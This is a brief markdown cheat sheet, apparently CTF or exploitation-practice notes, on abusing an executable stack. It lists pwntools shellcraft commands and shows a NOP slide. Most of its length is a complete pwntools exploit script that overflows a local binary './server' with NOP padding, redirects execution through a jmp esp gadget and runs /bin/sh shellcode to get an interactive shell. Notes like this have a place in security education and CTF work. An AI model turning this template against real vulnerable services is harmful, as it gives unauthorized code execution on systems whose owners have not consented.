# Abusing Executable Flag on Stack

## Payload

## Shellcraft
shellcraft on terminal
```
$ shellcraft -l
$ shellcraft i386.linux.sh
$ shellcraft i386.linux.sh -f a
```
shellcraft in pwntools
```
asm(shellcraft.cat(flag.txt))
asm(shellcraft.exit())
asm(shellcraft.sh())
```

## Nop Slide
```
payload += asm('nop') * offset
```

exploit
```
from pwn import *

#context.log_level = "debug"
elf = context.binary = ELF("./server", checksec=False)
rop = ROP(elf)
p = process(["./server"])

# Dynamically get jmp esp address
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# Shellcode
#shellcode = asm(shellcraft.cat('flag.txt'))
#shellcode += asm(shellcraft.exit())
shellcode = asm(shellcraft.sh())

payload = asm('nop') * 72
payload += asm('nop') * 4
#payload += p32(0x0804919f) #jmp esp from objdump -t FILE 
#payload += p32(jmp_esp) # OR just add jmp_esp

rop.raw(payload)
rop.raw(jmp_esp)
rop.raw(shellcode)

p.sendline(rop.chain())
p.interactive()
```



